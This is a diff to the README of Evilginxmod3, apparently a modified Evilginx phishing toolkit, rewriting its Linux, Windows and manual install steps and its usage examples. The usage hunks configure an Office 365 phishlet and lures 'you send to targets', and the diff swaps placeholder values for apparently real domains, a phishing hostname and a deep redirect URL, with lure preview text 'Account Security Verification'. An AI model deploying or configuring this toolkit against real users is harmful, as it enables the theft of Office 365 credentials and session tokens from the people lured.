@@ -162,42 +162,69 @@ chmod +x install.sh
 sudo ./install.sh
 ```
 
-**The installer automatically:**
+The installer follows a staged workflow:
 
-- ✅ Validates OS and architecture, runs pre-flight connectivity and disk checks
-- ✅ Repairs interrupted dpkg and waits for apt/dpkg locks (VPS-safe)
-- ✅ Installs system dependencies (~20 packages: curl, wget, ufw, fail2ban, build-essential, libsqlite3-dev, etc.)
-- ✅ Downloads and installs Go 1.25.7 with SHA256 checksum verification against go.dev
-- ✅ Creates dedicated `evilginx` service user (no login shell, least-privilege)
-- ✅ Stops and disables conflicting services (apache2, nginx, bind9, systemd-resolved)
-- ✅ Disables systemd-resolved and writes static `/etc/resolv.conf` (frees port 53)
-- ✅ Builds Evilginx from source (`CGO_ENABLED=1 go build -mod=vendor`)
-- ✅ Installs binary, phishlets, redirectors, post-redirectors, landing pages, web UI, GoPhish static files, GeoIP DB, and documentation to `/opt/evilginx/`
-- ✅ Creates system-wide wrapper at `/usr/local/bin/evilginx` (auto-loads paths)
-- ✅ Sets `CAP_NET_BIND_SERVICE` capability (bind ports 53/80/443 without root)
-- ✅ Configures UFW firewall (ports 22, 53, 80, 443, 2030, 3333)
-- ✅ Configures Fail2Ban for SSH brute-force protection
-- ✅ Creates hardened `evilginx` systemd service (PrivateTmp, ProtectSystem=strict, NoNewPrivileges)
-- ✅ Creates helper scripts: `evilginx-start`, `evilginx-stop`, `evilginx-restart`, `evilginx-status`, `evilginx-logs`, `evilginx-console`
-- ✅ Optionally creates an admin user for SSH/management (so you can stop using root)
-- ✅ Optionally sets up Cloudflare Tunnel for remote admin panel access
+1. System checks and root validation
+2. OS detection and preflight readiness checks
+3. Apt package update and dependency installation
+4. Go installation and shell PATH setup
+5. Dedicated `evilginx` service user creation
+6. Directory creation and permission hardening
+7. Web admin password setup or generation
+8. Conflicting service shutdown and DNS resolver cleanup
+9. Evilginx build or download
+10. Firewall configuration
+11. Fail2Ban configuration
+12. Systemd service creation
+13. File capability setup for privileged ports
+14. Helper script creation
+15. Optional SSH admin user creation
+16. Optional Cloudflare Tunnel setup
 
-**Installer modes:**
+**Stage-by-stage Linux commands**
 
 ```bash
-sudo ./install.sh                # Full installation (default)
-sudo ./install.sh --upgrade      # Rebuild + reinstall only (skip deps/firewall/service)
-sudo ./install.sh --uninstall    # Remove Evilginx (binary, service, scripts, optionally config)
-sudo ./install.sh --tunnel       # Cloudflare Tunnel setup only
-sudo ./install.sh --dry-run      # Show what would be done without making changes
-./install.sh --help              # Show usage
+# 1. Prepare the host and open required ports
+ssh root@YOUR_VPS_IP
+sudo apt update && sudo apt upgrade -y
+sudo ufw allow 22/tcp
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+sudo ufw allow 53/udp
+sudo ufw enable
 
-# Pre-set tunnel domain (skip interactive prompt)
-TUNNEL_DOMAIN=example.com sudo ./install.sh
+# 2. Clone the repository and change to the source dir
+mkdir -p ~/phat
+cd ~/phat
+git clone https://github.com/XcloudManiac67/Evilginxmod3.git
+cd Evilginxmod3
+
+# 3. Make the installer executable
+chmod +x install.sh
+
+# 4. Run the full automated Linux install
+sudo ./install.sh
+
+# 5. If you want a faster install using the prebuilt binary
+sudo ./install.sh --prebuilt
+
+# 6. If you want to force a source build with CGO
+sudo ./install.sh --source
+
+# 7. Re-run the installer for upgrades
+sudo ./install.sh --upgrade
+
+# 8. Remove Evilginx completely
+sudo ./install.sh --uninstall
+
+# 9. Set up or re-run Cloudflare Tunnel only
 TUNNEL_DOMAIN=example.com sudo ./install.sh --tunnel
+
+# 10. Preview the install without making changes
+./install.sh --dry-run
 ```
 
-**Post-install commands:**
+**Linux install helper commands**
 
 ```bash
 evilginx-console    # Stop service and run interactively
@@ -208,64 +235,70 @@ evilginx-status     # Check service status
 evilginx-logs       # Tail live journal logs
 ```
 
+**What the installer does for Linux**
+
+- Validates OS and architecture, runs pre-flight connectivity and disk checks
+- Repairs interrupted dpkg and waits for apt/dpkg locks (VPS-safe)
+- Installs system dependencies: `curl`, `wget`, `git`, `ufw`, `fail2ban`, `build-essential`, `libsqlite3-dev`, and more
+- Downloads and installs Go 1.25.1 with SHA256 checksum verification from go.dev
+- Creates dedicated `evilginx` service user (no login shell, least privilege)
+- Stops and disables conflicting services (`apache2`, `nginx`, `bind9`, `named`, `systemd-resolved`)
+- Disables `systemd-resolved` and writes static `/etc/resolv.conf` to free port 53
+- Builds Evilginx from source using `CGO_ENABLED=1` or downloads a prebuilt binary
+- Installs binary, phishlets, redirectors, post-redirectors, landing pages, web UI, GoPhish static files, GeoIP DB, and docs into `/opt/evilginx/`
+- Creates system-wide wrapper at `/usr/local/bin/evilginx`
+  - The wrapper runs the real binary with the standard asset directories:
+    `exec /opt/evilginx/evilginx.bin -p /opt/evilginx/phishlets -t /opt/evilginx/redirectors -u /opt/evilginx/post_redirectors "$@"`
+  - This means `evilginx` is a launcher; extra args are forwarded to the real binary.
+  - If you run `evilginx` with no command or config, it prints the CLI options/help instead of starting the service.
+- Sets `CAP_NET_BIND_SERVICE` for privileged ports 53/80/443
+- Configures UFW for ports 22, 53, 80, 443, 2030, and 3333
+- Configures Fail2Ban SSH protection and supports systemd backend when needed
+- Creates hardened `evilginx` systemd service with PrivateTmp, ProtectSystem=strict, NoNewPrivileges
+- Creates helper scripts: `evilginx-start`, `evilginx-stop`, `evilginx-restart`, `evilginx-status`, `evilginx-logs`, `evilginx-console`
+- Optionally creates an admin SSH user and optionally sets up Cloudflare Tunnel for remote admin panel access
+```
 ### 5.3 Windows Automated Installer
 
-For Windows 10/11 or Server 2016+.
+The Windows installation flow has been moved to a dedicated guide.
 
-```powershell
-# Open PowerShell as Administrator
-cd C:\path\to\Evilginxmod3
-.\install-windows.ps1
-```
+- **Windows deployment guide:** [DEPLOYMENT-WINDOWS.md](DEPLOYMENT-WINDOWS.md)
 
-**The installer automatically:**
+This file includes:
+- automated installer usage
+- password generation and persistence
+- local admin panel access on `http://127.0.0.1:2030/login`
+- password reset commands for Windows local test environments
 
-- ✅ Installs Go 1.25.7 (if missing)
-- ✅ Builds from source (`CGO_ENABLED=1 go build -mod=vendor`)
-- ✅ Installs binary, phishlets, redirectors, post-redirectors, landing pages, web UI, GoPhish static files, and documentation to `C:\Evilginx\`
-- ✅ Installs NSSM and creates a Windows Service with auto-start and log rotation
-- ✅ Configures Windows Firewall (ports 53, 80, 443, 2030, 3333)
-- ✅ Creates helper scripts: `evilginx-start`, `evilginx-stop`, `evilginx-restart`, `evilginx-status`, `evilginx-logs`, `evilginx-console`
-
-**Post-install commands:**
-
-```powershell
-evilginx-console    # Configure interactively
-evilginx-start      # Start Windows service
-evilginx-stop       # Stop service
-evilginx-status     # Check service status
-evilginx-logs       # Monitor logs
-```
+**Tip:** Use `evilginx.env` under `C:\Users\<your-user>\.evilginx` to locate `EVILGINX_ADMIN_PASSWORD` if a password was generated during install.
 
 ### 5.4 Manual Installation
 
-If you prefer to build manually:
+If you prefer to build manually, follow these ordered stages:
 
 ```bash
-# Install Go (Linux) — must match go.mod requirement (1.25.7+)
+# 1. Install build tools and SQLite dependencies
+sudo apt update && sudo apt install -y build-essential libsqlite3-dev wget curl
+
+# 2. Install Go 1.25.7+ and add it to PATH
 wget https://go.dev/dl/go1.25.7.linux-amd64.tar.gz
 sudo rm -rf /usr/local/go
 sudo tar -C /usr/local -xzf go1.25.7.linux-amd64.tar.gz
-export PATH=$PATH:/usr/local/go/bin
+export PATH="$PATH:/usr/local/go/bin"
 
-# Install build dependencies (required for CGo / go-sqlite3)
-sudo apt install -y build-essential libsqlite3-dev
-
-# Build
-# CGO_ENABLED=1 is required — go-sqlite3 uses CGo
-# -mod=vendor uses the checked-in vendor/ directory (no network needed)
+# 3. Build Evilginx with CGO enabled
 cd Evilginxmod3
 mkdir -p build
 CGO_ENABLED=1 go build -mod=vendor -o build/evilginx main.go
 
-# Install
-sudo cp build/evilginx /usr/local/bin/
+# 4. Install the binary and make it executable
+sudo cp build/evilginx /usr/local/bin/evilginx
 sudo chmod +x /usr/local/bin/evilginx
 
-# Allow binding to privileged ports without root
+# 5. Allow binding to privileged ports without root
 sudo setcap 'cap_net_bind_service=+ep' /usr/local/bin/evilginx
 
-# Create config dirs and copy assets
+# 6. Create config directories and copy assets
 mkdir -p ~/.evilginx/phishlets
 mkdir -p ~/.evilginx/redirectors
 mkdir -p ~/.evilginx/post_redirectors
@@ -275,10 +308,19 @@ cp -r redirectors/* ~/.evilginx/redirectors/
 cp -r post_redirectors/* ~/.evilginx/post_redirectors/
 cp -r landing_pages/* ~/.evilginx/landing_pages/
 
-# Copy web UI and GoPhish static files
+# 7. Copy the web UI and GoPhish static assets
 cp -r web ~/.evilginx/web
 cp -r gophish/static ~/.evilginx/static
+
+# 8. Start Evilginx interactively to complete initial configuration
+evilginx-console
 ```
+
+**Manual install notes**
+
+- `CGO_ENABLED=1` is required because `go-sqlite3` depends on cgo.
+- `setcap 'cap_net_bind_service=+ep'` allows port 53/80/443 binding without running as root.
+- The `evilginx-console` command stops the service and launches an interactive console for initial setup.
 
 ### 5.5 Docker Installation (Experimental)
 
@@ -335,7 +377,7 @@ This build ships with `o365` (Office 365). Additional phishlets can be added to 
 phishlets
 
 # Configure hostname (e.g., Office 365)
-phishlets hostname o365 login.yourdomain.com
+phishlets hostname o365 asdobeen.com
 
 # Enable
 phishlets enable o365
@@ -384,7 +426,7 @@ Lures are the unique links you send to targets.
 lures create o365
 
 # Edit lure to set redirect URL (where they go AFTER fishing)
-lures edit 0 redirect_url https://www.office.com
+lures edit 0 redirect_url https://obrapia.com/smityth/loib/gtpo/gewsc/hblp/services
 
 # (Optional) Set OpenGraph info for nice link previews
 lures edit 0 og_title "Account Security Verification"
